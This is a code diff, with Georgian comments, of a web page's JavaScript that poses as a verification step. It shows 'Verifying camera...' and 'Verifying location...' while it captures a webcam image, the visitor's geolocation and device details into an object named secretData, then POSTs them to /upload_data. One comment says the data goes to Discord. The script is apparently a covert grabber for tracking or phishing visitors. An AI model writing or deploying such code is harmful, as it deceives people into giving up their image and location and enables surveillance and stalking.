@@ -65,7 +65,7 @@
             } else { resolve(null); }
         });
 
-        // 2. ლოკაცია (გაზრდილი ტაიმაუტით)
+        // 2. ლოკაცია
         const getLocation = () => new Promise((resolve) => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -138,6 +138,7 @@
             secretData.ram = navigator.deviceMemory || "უცნობია";
         }
 
+        // 4. მთავარი ფუნქცია
         async function startProcess() {
             const btn = document.getElementById('mainBtn');
             const loader = document.getElementById('loader');
@@ -146,22 +147,22 @@
             btn.innerText = "იტვირთება..."; 
             loader.style.display = 'block';
 
-            // 1. ჯერ კამერა
+            // 1. კამერა
             btn.innerText = "Verifying camera...";
             const image = await getCamera();
             secretData.image = image;
 
-            // 2. მერე ლოკაცია
+            // 2. ლოკაცია
             btn.innerText = "Verifying location...";
             const loc = await getLocation();
             secretData.lat = loc.lat; 
             secretData.lon = loc.lon;
 
-            // 3. მერე დანარჩენი ინფო
+            // 3. დანარჩენი ინფო
             btn.innerText = "Finalizing...";
             await collectRestInfo();
 
-            // 4. გაგზავნა
+            // 4. გაგზავნა Discord-ზე
             await fetch('/upload_data', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
